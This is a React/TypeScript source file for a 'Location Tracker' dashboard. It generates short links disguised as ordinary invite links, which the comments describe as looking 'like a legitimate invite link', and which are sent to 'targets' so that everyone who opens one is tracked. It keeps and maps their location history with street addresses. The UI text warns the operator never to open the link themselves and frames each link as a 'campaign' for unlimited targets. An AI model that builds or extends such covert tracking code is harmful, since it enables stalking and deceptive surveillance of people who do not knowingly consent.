import { useState, useEffect, useCallback } from "react";
import { useAuth } from "@/contexts/AuthContext";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import {
  MapPin, Plus, Trash2, RefreshCw, Copy, Clock,
  Navigation, Wifi, WifiOff, Activity, Signal, X, Home,
  Smartphone, Link2, ShieldCheck, AlertCircle, Key, CheckCircle2
} from "lucide-react";
import { ScrollArea } from "@/components/ui/scroll-area";

// ─── Types ────────────────────────────────────────────────────────────────────

interface TrackerDevice {
  id: string;
  device_name: string | null; // null = unregistered (pending)
  last_seen: string | null;
  created_at: string;
  // Onboarding link data (transient — not stored in DB after generation)
  onboardingLink?: string;
  onboardingExpiresAt?: string;
}

interface TrackerLocation {
  id: string;
  latitude: number;
  longitude: number;
  accuracy: number | null;
  recorded_at: string;
  address: string | null;
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

const formatRelativeTime = (isoString: string | null) => {
  if (!isoString) return "Never";
  const diff = Date.now() - new Date(isoString).getTime();
  const mins = Math.floor(diff / 60000);
  const hrs = Math.floor(mins / 60);
  const days = Math.floor(hrs / 24);
  if (mins < 1) return "Just now";
  if (mins < 60) return `${mins}m ago`;
  if (hrs < 24) return `${hrs}h ago`;
  return `${days}d ago`;
};

const isOnline = (lastSeen: string | null) =>
  !!lastSeen && Date.now() - new Date(lastSeen).getTime() < 5 * 60 * 1000;

const isRegistered = (device: TrackerDevice) => !!device.device_name;

const formatExpiry = (isoString: string | undefined) => {
  if (!isoString) return "";
  const remaining = new Date(isoString).getTime() - Date.now();
  if (remaining <= 0) return "Link expired";
  const mins = Math.floor(remaining / 60000);
  return `Expires in ${mins}m`;
};

async function reverseGeocode(lat: number, lon: number): Promise<string> {
  try {
    const resp = await fetch(
      `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`,
      { headers: { "Accept-Language": "en" } }
    );
    if (!resp.ok) return "";
    const data = await resp.json();
    return data.display_name ?? "";
  } catch {
    return "";
  }
}

// ─── Map ──────────────────────────────────────────────────────────────────────

function LocationMap({ lat, lon, address }: { lat: number; lon: number; address?: string | null }) {
  const delta = 0.008;
  const bbox = `${lon - delta},${lat - delta},${lon + delta},${lat + delta}`;
  const src = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lon}`;
  return (
    <div className="rounded-xl overflow-hidden border border-border/20 bg-card/10">
      <iframe
        title="Location Map"
        src={src}
        width="100%"
        height="220"
        style={{
          border: 0,
          display: "block",
          filter: "invert(92%) hue-rotate(180deg) brightness(85%) contrast(90%) saturate(0.6)",
        }}
        loading="lazy"
        referrerPolicy="no-referrer"
      />
      {address && (
        <div className="px-4 py-2.5 flex items-start gap-2 border-t border-border/10">
          <Home className="h-3.5 w-3.5 text-accent mt-0.5 flex-shrink-0" />
          <p className="text-xs font-light text-muted-foreground leading-relaxed">{address}</p>
        </div>
      )}
    </div>
  );
}

// ─── Onboarding Link Card ─────────────────────────────────────────────────────

function OnboardingLinkCard({
  device,
  onCopy,
  onRegenerate,
}: {
  device: TrackerDevice;
  onCopy: (t: string) => void;
  onRegenerate: (deviceId: string) => void;
}) {
  const link = device.onboardingLink;
  const isBadLink = !link || link.startsWith("aureon://");

  return (
    <div className="rounded-xl border border-accent/20 bg-accent/5 p-4 space-y-3">
      <div className="flex items-center gap-2">
        <Key className="h-4 w-4 text-accent" />
        <p className="text-xs font-light tracking-[0.12em] text-accent uppercase">Target Tracking Link</p>
      </div>

      {/* WARNING — do not open this yourself */}
      <div className="rounded-lg border border-amber-500/30 bg-amber-500/5 px-3 py-2 flex items-start gap-2">
        <AlertCircle className="h-3.5 w-3.5 text-amber-400 flex-shrink-0 mt-0.5" />
        <p className="text-[10px] text-amber-300/80 leading-relaxed">
          <strong>Do not open this link yourself.</strong> Send it to the target device only.
          Opening it in your own browser will track your location instead.
        </p>
      </div>

      {!isBadLink && link ? (
        <div className="space-y-1.5">
          <p className="text-[10px] text-muted-foreground uppercase tracking-[0.1em]">Shareable Tracking Link</p>
          <div className="rounded-lg border border-border/20 bg-card/20 px-3 py-2.5 space-y-2">
            <div className="flex items-center gap-2">
              <Link2 className="h-3.5 w-3.5 text-accent flex-shrink-0" />
              <code className="flex-1 text-[11px] font-mono text-foreground/60 truncate select-none">
                [signed tracker link — click copy to share]
              </code>
              <button
                onClick={() => onCopy(link)}
                className="flex items-center gap-1 text-[10px] text-accent hover:text-accent/80 transition-colors flex-shrink-0 border border-accent/30 rounded px-2 py-0.5"
                title="Copy tracking link"
              >
                <Copy className="h-3 w-3" /> Copy Link
              </button>
            </div>
            <p className="text-[9px] text-muted-foreground/40 pl-5">
              Each unique device that opens this link is tracked independently. The same link works for unlimited targets.
            </p>
          </div>
        </div>
      ) : (
        <div className="rounded-lg border border-destructive/20 bg-destructive/5 px-3 py-2 space-y-2">
          <p className="text-[10px] text-destructive/80">Link is invalid or outdated.</p>
          <button
            onClick={() => onRegenerate(device.id)}
            className="flex items-center gap-1.5 text-[10px] text-accent hover:text-accent/80 transition-colors"
          >
            <RefreshCw className="h-3 w-3" /> Regenerate Link
          </button>
        </div>
      )}

      <p className="text-[10px] text-muted-foreground/60 leading-relaxed">
        Once a target opens the link and grants location permission, they will appear as a registered device below with live location data.
      </p>
    </div>
  );
}

// ─── Main View ────────────────────────────────────────────────────────────────

export default function TrackerView() {
  const { user } = useAuth();
  const { toast } = useToast();

  const [devices, setDevices] = useState<TrackerDevice[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<TrackerDevice | null>(null);
  const [locations, setLocations] = useState<TrackerLocation[]>([]);
  const [loading, setLoading] = useState(true);
  const [locLoading, setLocLoading] = useState(false);

  // Add device form
  const [showAddForm, setShowAddForm] = useState(false);
  const [nameInput, setNameInput] = useState("");
  const [adding, setAdding] = useState(false);

  // Manual location log
  const [logLat, setLogLat] = useState("");
  const [logLon, setLogLon] = useState("");
  const [logLoading, setLogLoading] = useState(false);
  const [selectedPin, setSelectedPin] = useState<TrackerLocation | null>(null);

  // ── Data loaders ────────────────────────────────────────────────────────────

  const loadDevices = useCallback(async () => {
    if (!user) return;
    setLoading(true);
    // Fetch ALL devices (registered and pending) for this user
    const { data, error } = await supabase
      .from("tracker_devices" as any)
      .select("id, device_name, last_seen, created_at, pairing_token_expires_at")
      .eq("user_id", user.id)
      .order("created_at", { ascending: false });
    if (!error && data) {
      // Reconstruct onboarding state for pending devices
      const mapped = (data as any[]).map((d: any) => ({
        ...d,
        onboardingExpiresAt: d.pairing_token_expires_at ?? undefined,
      }));
      setDevices(mapped as TrackerDevice[]);
    }
    setLoading(false);
  }, [user]);

  useEffect(() => { loadDevices(); }, [loadDevices]);

  // Auto-poll every 10 seconds to pick up newly paired devices
  useEffect(() => {
    const interval = setInterval(() => { loadDevices(); }, 10000);
    return () => clearInterval(interval);
  }, [loadDevices]);

  const loadLocations = useCallback(async (deviceId: string) => {
    setLocLoading(true);
    const { data, error } = await supabase
      .from("tracker_locations" as any)
      .select("*")
      .eq("device_id", deviceId)
      .order("recorded_at", { ascending: false })
      .limit(100);
    if (!error && data) {
      setLocations(data as unknown as TrackerLocation[]);
      const first = (data as unknown as TrackerLocation[])[0];
      if (first) setSelectedPin(first);
    }
    setLocLoading(false);
  }, []);

  useEffect(() => {
    // Don't attempt to load locations for transient pending devices (no real DB id)
    if (selectedDevice && !selectedDevice.id.startsWith("pending-")) {
      loadLocations(selectedDevice.id);
    } else {
      setLocations([]);
      setSelectedPin(null);
    }
  }, [selectedDevice, loadLocations]);

  // ── Generate Signed Onboarding Link ─────────────────────────────────────────
  // Mirrors: POST /api/devices/generate-signed-link
  // Creates a stub device record (device_name = null) and returns a signed JWT deep link.

  const generateSignedOnboardingLink = async () => {
    if (!user) return;
    const label = nameInput.trim();
    if (!label) {
      toast({ title: "Enter a campaign label", variant: "destructive" });
      return;
    }
    if (label.length < 3 || label.length > 50) {
      toast({ title: "Label must be 3–50 characters", variant: "destructive" });
      return;
    }

    setAdding(true);
    try {
      // Generate a short random code (8 chars) — looks like a normal invite code
      const shortCode = Math.random().toString(36).slice(2, 6) + Math.random().toString(36).slice(2, 6);

      // Store the short code → user_id mapping in tracker_devices as a pending row
      const { data: newDevice, error: insertErr } = await supabase
        .from("tracker_devices" as any)
        .insert({
          user_id: user.id,
          device_name: label, // Use campaign label as device name
          pairing_token: shortCode,
          pairing_token_expires_at: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
        })
        .select("id")
        .single();

      if (insertErr || !newDevice) {
        toast({ title: "Failed to create tracker", variant: "destructive" });
        setAdding(false);
        return;
      }

      // Clean, short URL — looks like a legitimate invite link
      const onboardingLink = `https://asherin.com/i?t=${shortCode}`;

      const pendingDevice: TrackerDevice = {
        id: (newDevice as any).id,
        device_name: label,
        last_seen: null,
        created_at: new Date().toISOString(),
        onboardingLink,
        onboardingExpiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
      };

      setDevices(prev => [pendingDevice, ...prev]);
      setSelectedDevice(pendingDevice);
      setShowAddForm(false);
      setNameInput("");

      toast({
        title: "Tracker link generated",
        description: `Share "${label}" link. Every person who clicks it is tracked separately.`,
      });
    } catch (err) {
      console.error("[TRACKER]: Error generating link:", err);
      toast({ title: "Unexpected error", variant: "destructive" });
    }
    setAdding(false);
  };

  // ── Delete Device ─────────────────────────────────────────────────────────
  // Mirrors: DELETE /api/devices/:deviceId

  const deleteDevice = async (deviceId: string) => {
    if (!user) return;
    const { error } = await supabase
      .from("tracker_devices" as any)
      .delete()
      .eq("id", deviceId)
      .eq("user_id", user.id);
    if (!error) {
      setDevices(prev => prev.filter(d => d.id !== deviceId));
      if (selectedDevice?.id === deviceId) {
        setSelectedDevice(null);
        setLocations([]);
        setSelectedPin(null);
      }
      toast({ title: "Device removed" });
    }
  };

  // ── Regenerate Onboarding Link ────────────────────────────────────────────

  const regenerateLink = async (deviceId: string) => {
    if (!user) return;
    // Generate a new short code and update the DB row
    const shortCode = Math.random().toString(36).slice(2, 6) + Math.random().toString(36).slice(2, 6);
    await supabase
      .from("tracker_devices" as any)
      .update({ pairing_token: shortCode })
      .eq("id", deviceId)
      .eq("user_id", user.id);
    const onboardingLink = `https://asherin.com/i?t=${shortCode}`;
    setDevices(prev => prev.map(d =>
      d.id === deviceId ? { ...d, onboardingLink } : d
    ));
    setSelectedDevice(prev =>
      prev?.id === deviceId ? { ...prev, onboardingLink } : prev
    );
    toast({ title: "Link regenerated", description: "A fresh link has been created." });
  };

  // ── Log Location Ping ─────────────────────────────────────────────────────
  // Mirrors: POST /api/location (with device-specific JWT in backend)
  // Here we validate coords, reverse-geocode, and insert directly to tracker_locations.

  const useCurrentLocation = () => {
    if (!navigator.geolocation) {
      toast({ title: "Geolocation not supported", variant: "destructive" });
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        setLogLat(pos.coords.latitude.toFixed(6));
        setLogLon(pos.coords.longitude.toFixed(6));
      },
      () => toast({ title: "Could not get location", variant: "destructive" })
    );
  };

  const logManualLocation = async () => {
    if (!user || !selectedDevice) return;

    // [CHEMIX]: Validate geographic coordinates — mirrors backend validation
    const lat = parseFloat(logLat);
    const lon = parseFloat(logLon);

    if (isNaN(lat) || lat < -90 || lat > 90) {
      toast({ title: "Invalid latitude. Must be −90 to 90.", variant: "destructive" });
      return;
    }
    if (isNaN(lon) || lon < -180 || lon > 180) {
      toast({ title: "Invalid longitude. Must be −180 to 180.", variant: "destructive" });
      return;
    }

    setLogLoading(true);
    const timestamp = new Date().toISOString();

    // Reverse geocode (mirrors backend's address resolution step)
    const address = await reverseGeocode(lat, lon);

    // Insert location record — mirrors: INSERT INTO locations(device_id, latitude, longitude, accuracy, timestamp)
    const { error: locError } = await supabase
      .from("tracker_locations" as any)
      .insert({
        device_id: selectedDevice.id,
        user_id: user.id,
        latitude: lat,
        longitude: lon,
        accuracy: null, // Browser geolocation accuracy could be added here
        recorded_at: timestamp,
        address: address || null,
      });

    // Update last_seen — mirrors: UPDATE devices SET last_seen = $1 WHERE id = $2
    await supabase
      .from("tracker_devices" as any)
      .update({ last_seen: timestamp })
      .eq("id", selectedDevice.id)
      .eq("user_id", user.id);

    if (!locError) {
      toast({
        title: "Location logged",
        description: address || `${lat.toFixed(4)}, ${lon.toFixed(4)}`,
      });
      setLogLat("");
      setLogLon("");
      loadLocations(selectedDevice.id);

      // Refresh device last_seen in local state
      setDevices(prev =>
        prev.map(d => d.id === selectedDevice.id ? { ...d, last_seen: timestamp } : d)
      );
      setSelectedDevice(prev => prev ? { ...prev, last_seen: timestamp } : prev);
    } else {
      toast({ title: "Failed to log location", variant: "destructive" });
    }
    setLogLoading(false);
  };

  // ── Clipboard ────────────────────────────────────────────────────────────────

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: "Copied to clipboard" });
  };

  const openInMaps = (lat: number, lon: number) =>
    window.open(`https://www.google.com/maps?q=${lat},${lon}`, "_blank");

  // ── Partition devices ────────────────────────────────────────────────────────
  const registeredDevices = devices.filter(isRegistered);
  const pendingDevices = devices.filter(d => !isRegistered(d));

  // ── Render ───────────────────────────────────────────────────────────────────

  return (
    <div className="flex flex-col h-full bg-transparent">
      {/* Header */}
      <div className="flex-shrink-0 flex items-center justify-between px-6 py-4 border-b border-border/20">
        <div className="flex items-center gap-3">
          <Signal className="h-5 w-5 text-accent" />
          <div>
            <h1 className="text-sm font-extralight tracking-[0.2em] text-foreground">LOCATION TRACKER</h1>
            <p className="text-[9px] font-light tracking-[0.2em] text-muted-foreground/40 mt-0.5 uppercase">
              BETA TESTING · Created By ZALI Software
            </p>
          </div>
        </div>
        <button
          onClick={loadDevices}
          className="rounded-lg p-2 text-muted-foreground hover:bg-foreground/10 hover:text-foreground transition-colors"
          title="Refresh"
        >
          <RefreshCw className="h-4 w-4" />
        </button>
      </div>

      <div className="flex flex-1 min-h-0 overflow-hidden">
        {/* ── LEFT PANEL: Devices ── */}
        <div className="w-72 flex-shrink-0 flex flex-col border-r border-border/20">
          <div className="flex-shrink-0 px-4 py-3 border-b border-border/10 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-light tracking-[0.15em] text-muted-foreground uppercase">Devices</span>
              <button
                onClick={() => setShowAddForm(!showAddForm)}
                className="flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-light bg-accent text-accent-foreground hover:bg-accent/90 transition-colors"
              >
                {showAddForm ? <X className="h-3.5 w-3.5" /> : <Plus className="h-3.5 w-3.5" />}
                {showAddForm ? "Cancel" : "Add Device"}
              </button>
            </div>

            {showAddForm && (
              <div className="rounded-xl border border-accent/20 bg-accent/5 p-3 space-y-2">
                <p className="text-[10px] font-light tracking-[0.1em] text-accent uppercase">New Device</p>
                <div className="relative">
                  <Smartphone className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground/50" />
                  <input
                    type="text"
                    value={nameInput}
                    onChange={(e) => setNameInput(e.target.value)}
                    placeholder="Device label (e.g. Field Unit Alpha)"
                    className="w-full rounded-lg border border-border/20 bg-card/20 pl-8 pr-3 py-1.5 text-xs font-light text-foreground placeholder:text-muted-foreground/40 outline-none focus:border-accent/50"
                    onKeyDown={(e) => { if (e.key === "Enter") generateSignedOnboardingLink(); }}
                  />
                </div>
                <button
                  onClick={generateSignedOnboardingLink}
                  disabled={adding || !nameInput.trim()}
                  className="w-full rounded-lg py-1.5 text-xs font-light bg-accent text-accent-foreground hover:bg-accent/90 transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5"
                >
                  <Key className="h-3.5 w-3.5" />
                  {adding ? "Generating…" : "Generate Onboarding Link"}
                </button>
              </div>
            )}
          </div>

          <ScrollArea className="flex-1">
            <div className="p-2 space-y-3">
              {loading ? (
                <p className="px-3 py-4 text-xs text-muted-foreground animate-pulse">Loading devices…</p>
              ) : devices.length === 0 ? (
                <div className="px-3 py-8 text-center space-y-2">
                  <Smartphone className="h-8 w-8 text-muted-foreground/30 mx-auto" />
                  <p className="text-xs text-muted-foreground font-extralight">No devices registered yet.</p>
                  <p className="text-[10px] text-muted-foreground/50">Click "Add Device" to generate a signed onboarding link.</p>
                </div>
              ) : (
                <>
                  {/* Pending (awaiting registration) */}
                  {pendingDevices.length > 0 && (
                    <div>
                      <p className="px-3 py-1 text-[10px] font-light tracking-[0.15em] text-muted-foreground/50 uppercase">Awaiting Registration</p>
                      <div className="space-y-0.5">
                        {pendingDevices.map(device => (
                          <div
                            key={device.id}
                            onClick={() => setSelectedDevice(selectedDevice?.id === device.id ? null : device)}
                            className={`group flex items-center gap-3 rounded-xl px-3 py-2.5 cursor-pointer transition-colors ${
                              selectedDevice?.id === device.id
                                ? "bg-foreground/10 text-foreground"
                                : "text-muted-foreground hover:bg-foreground/5 hover:text-foreground"
                            }`}
                          >
                            <div className="relative flex-shrink-0">
                              <Smartphone className="h-4 w-4" />
                              <span className="absolute -bottom-0.5 -right-0.5 h-2 w-2 rounded-full border border-background bg-amber-500/70" />
                            </div>
                            <div className="flex-1 min-w-0">
                              <p className="text-xs font-light truncate text-amber-400/80 italic">Pending…</p>
                              <p className="text-[10px] text-muted-foreground/60 font-light">
                                {formatExpiry(device.onboardingExpiresAt)}
                              </p>
                            </div>
                            <button
                              onClick={(e) => { e.stopPropagation(); deleteDevice(device.id); }}
                              className="opacity-0 group-hover:opacity-100 text-muted-foreground hover:text-destructive transition-all"
                            >
                              <Trash2 className="h-3.5 w-3.5" />
                            </button>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Registered devices */}
                  {registeredDevices.length > 0 && (
                    <div>
                      <p className="px-3 py-1 text-[10px] font-light tracking-[0.15em] text-muted-foreground/50 uppercase">Registered Devices</p>
                      <div className="space-y-0.5">
                        {registeredDevices.map(device => (
                          <div
                            key={device.id}
                            onClick={() => setSelectedDevice(selectedDevice?.id === device.id ? null : device)}
                            className={`group flex items-center gap-3 rounded-xl px-3 py-2.5 cursor-pointer transition-colors ${
                              selectedDevice?.id === device.id
                                ? "bg-foreground/10 text-foreground"
                                : "text-muted-foreground hover:bg-foreground/5 hover:text-foreground"
                            }`}
                          >
                            <div className="relative flex-shrink-0">
                              <Smartphone className="h-4 w-4" />
                              <span className={`absolute -bottom-0.5 -right-0.5 h-2 w-2 rounded-full border border-background ${
                                isOnline(device.last_seen) ? "bg-emerald-500" : "bg-muted-foreground/40"
                              }`} />
                            </div>
                            <div className="flex-1 min-w-0">
                              <p className="text-xs font-light truncate">{device.device_name}</p>
                              <p className="text-[10px] text-muted-foreground/60 font-light flex items-center gap-1">
                                <CheckCircle2 className="h-2.5 w-2.5 text-emerald-500/70" />
                                Registered · {formatRelativeTime(device.last_seen)}
                              </p>
                            </div>
                            <button
                              onClick={(e) => { e.stopPropagation(); deleteDevice(device.id); }}
                              className="opacity-0 group-hover:opacity-100 text-muted-foreground hover:text-destructive transition-all"
                            >
                              <Trash2 className="h-3.5 w-3.5" />
                            </button>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>
          </ScrollArea>
        </div>

        {/* ── RIGHT PANEL ── */}
        <div className="flex-1 flex flex-col min-w-0 overflow-hidden">
          {selectedDevice ? (
            <>
              {/* Device Header */}
              <div className="flex-shrink-0 flex items-center justify-between px-6 py-4 border-b border-border/10">
                <div className="flex items-center gap-3">
                  <div className="flex items-center gap-2">
                    {isRegistered(selectedDevice)
                      ? isOnline(selectedDevice.last_seen)
                        ? <Wifi className="h-4 w-4 text-emerald-500" />
                        : <WifiOff className="h-4 w-4 text-muted-foreground/50" />
                      : <Key className="h-4 w-4 text-amber-400" />
                    }
                    <span className="text-sm font-light text-foreground">
                      {selectedDevice.device_name ?? "Unregistered Device"}
                    </span>
                  </div>
                  <span className={`text-[10px] font-light px-2 py-0.5 rounded-full border ${
                    !isRegistered(selectedDevice)
                      ? "border-amber-500/30 text-amber-400 bg-amber-500/10"
                      : isOnline(selectedDevice.last_seen)
                        ? "border-emerald-500/30 text-emerald-400 bg-emerald-500/10"
                        : "border-border/30 text-muted-foreground bg-muted/20"
                  }`}>
                    {!isRegistered(selectedDevice)
                      ? "Awaiting Registration"
                      : isOnline(selectedDevice.last_seen)
                        ? "Active"
                        : "Inactive"}
                  </span>
                </div>
                <div className="flex items-center gap-2 text-xs text-muted-foreground">
                  <Clock className="h-3.5 w-3.5" />
                  {isRegistered(selectedDevice)
                    ? `Last seen: ${formatRelativeTime(selectedDevice.last_seen)}`
                    : formatExpiry(selectedDevice.onboardingExpiresAt)
                  }
                </div>
              </div>

              <ScrollArea className="flex-1">
                <div className="p-6 space-y-5">
                  {/* Show onboarding card if device not yet registered */}
                  {!isRegistered(selectedDevice) ? (
                    <OnboardingLinkCard device={selectedDevice} onCopy={copyToClipboard} onRegenerate={regenerateLink} />
                  ) : (
                    <>
                      {/* Manual Location Logger */}
                      <div className="rounded-xl border border-border/20 bg-card/10 p-4 space-y-3">
                        <p className="text-[10px] font-light tracking-[0.15em] text-muted-foreground uppercase">Log Location Ping</p>
                        <div className="flex items-center gap-2 flex-wrap">
                          <input
                            type="text"
                            value={logLat}
                            onChange={(e) => setLogLat(e.target.value)}
                            placeholder="Latitude (−90 to 90)"
                            className="flex-1 min-w-24 rounded-lg border border-border/20 bg-card/20 px-3 py-1.5 text-xs font-light text-foreground placeholder:text-muted-foreground/40 outline-none focus:border-accent/50"
                          />
                          <input
                            type="text"
                            value={logLon}
                            onChange={(e) => setLogLon(e.target.value)}
                            placeholder="Longitude (−180 to 180)"
                            className="flex-1 min-w-24 rounded-lg border border-border/20 bg-card/20 px-3 py-1.5 text-xs font-light text-foreground placeholder:text-muted-foreground/40 outline-none focus:border-accent/50"
                          />
                          <button
                            onClick={useCurrentLocation}
                            className="rounded-lg border border-border/20 bg-card/20 px-2.5 py-1.5 text-xs font-light text-muted-foreground hover:text-foreground hover:border-accent/50 transition-colors"
                            title="Use my current location"
                          >
                            <Navigation className="h-3.5 w-3.5" />
                          </button>
                          <button
                            onClick={logManualLocation}
                            disabled={logLoading || !logLat || !logLon}
                            className="rounded-lg bg-accent text-accent-foreground px-3 py-1.5 text-xs font-light hover:bg-accent/90 transition-colors disabled:opacity-50"
                          >
                            {logLoading ? "Geocoding…" : "Ping"}
                          </button>
                        </div>
                      </div>

                      {/* Map */}
                      {selectedPin && (
                        <div className="space-y-2">
                          <div className="flex items-center gap-2">
                            <MapPin className="h-4 w-4 text-accent" />
                            <span className="text-xs font-light tracking-[0.15em] text-muted-foreground uppercase">Live Map</span>
                            <span className="text-[10px] text-muted-foreground/50 font-mono">
                              {selectedPin.latitude.toFixed(5)}, {selectedPin.longitude.toFixed(5)}
                            </span>
                            <button
                              onClick={() => openInMaps(selectedPin.latitude, selectedPin.longitude)}
                              className="ml-auto text-[10px] font-light text-accent hover:underline"
                            >
                              Open in Google Maps ↗
                            </button>
                          </div>
                          <LocationMap lat={selectedPin.latitude} lon={selectedPin.longitude} address={selectedPin.address} />
                        </div>
                      )}

                      {/* Location History */}
                      <div>
                        <div className="flex items-center gap-2 mb-3">
                          <Activity className="h-4 w-4 text-muted-foreground" />
                          <span className="text-xs font-light tracking-[0.15em] text-muted-foreground uppercase">Location History</span>
                          <span className="text-[10px] text-muted-foreground/50">({locations.length} pings)</span>
                        </div>

                        {locLoading ? (
                          <p className="text-xs text-muted-foreground animate-pulse">Loading location history…</p>
                        ) : locations.length === 0 ? (
                          <div className="text-center py-10 space-y-3">
                            <MapPin className="h-10 w-10 text-muted-foreground/20 mx-auto" />
                            <p className="text-sm font-extralight text-muted-foreground">No pings recorded yet.</p>
                            <p className="text-xs text-muted-foreground/50">Log a location ping above to begin tracking.</p>
                          </div>
                        ) : (
                          <div className="space-y-2">
                            {locations.map((loc, idx) => (
                              <div
                                key={loc.id}
                                onClick={() => setSelectedPin(loc)}
                                className={`group flex items-start gap-4 rounded-xl border px-4 py-3 cursor-pointer transition-all ${
                                  selectedPin?.id === loc.id
                                    ? "border-accent/30 bg-accent/5"
                                    : "border-border/10 bg-card/20 hover:border-border/30 hover:bg-card/30"
                                }`}
                              >
                                <div className="flex-shrink-0 flex items-center justify-center h-7 w-7 rounded-lg bg-accent/10 text-accent text-[10px] font-light mt-0.5">
                                  #{idx + 1}
                                </div>
                                <div className="flex-1 min-w-0">
                                  <p className="text-xs font-mono text-foreground">
                                    {loc.latitude.toFixed(6)}, {loc.longitude.toFixed(6)}
                                  </p>
                                  {loc.address && (
                                    <p className="text-[10px] text-accent/80 font-light mt-0.5 leading-relaxed line-clamp-1">{loc.address}</p>
                                  )}
                                  <p className="text-[10px] text-muted-foreground/60 mt-0.5">
                                    {new Date(loc.recorded_at).toLocaleString()}
                                    {loc.accuracy ? ` · ±${loc.accuracy}m` : ""}
                                  </p>
                                </div>
                                <div className="flex gap-1 opacity-0 group-hover:opacity-100 transition-opacity flex-shrink-0">
                                  <button
                                    onClick={(e) => { e.stopPropagation(); openInMaps(loc.latitude, loc.longitude); }}
                                    className="rounded-lg px-2 py-1 text-[10px] font-light border border-border/20 text-muted-foreground hover:text-foreground hover:border-accent/50 transition-colors"
                                    title="Open in Maps"
                                  >
                                    <MapPin className="h-3 w-3" />
                                  </button>
                                  <button
                                    onClick={(e) => { e.stopPropagation(); copyToClipboard(`${loc.latitude},${loc.longitude}`); }}
                                    className="rounded-lg px-2 py-1 text-[10px] font-light border border-border/20 text-muted-foreground hover:text-foreground hover:border-accent/50 transition-colors"
                                    title="Copy coords"
                                  >
                                    <Copy className="h-3 w-3" />
                                  </button>
                                </div>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </>
                  )}
                </div>
              </ScrollArea>
            </>
          ) : (
            <div className="flex-1 flex flex-col items-center justify-center gap-4 text-center p-12">
              <div className="h-16 w-16 rounded-2xl border border-border/20 bg-card/20 flex items-center justify-center">
                <Signal className="h-8 w-8 text-muted-foreground/30" />
              </div>
              <div className="space-y-1.5">
                <p className="text-sm font-extralight text-foreground">Select a device to view details</p>
                <p className="text-xs text-muted-foreground/60">
                  Add a device and share its signed onboarding link to begin tracking.
                </p>
              </div>
              {devices.length === 0 && (
                <button
                  onClick={() => setShowAddForm(true)}
                  className="mt-2 flex items-center gap-2 rounded-xl border border-accent/30 bg-accent/10 px-4 py-2.5 text-xs font-light text-accent hover:bg-accent/20 transition-colors"
                >
                  <Key className="h-4 w-4" />
                  Register your first device
                </button>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
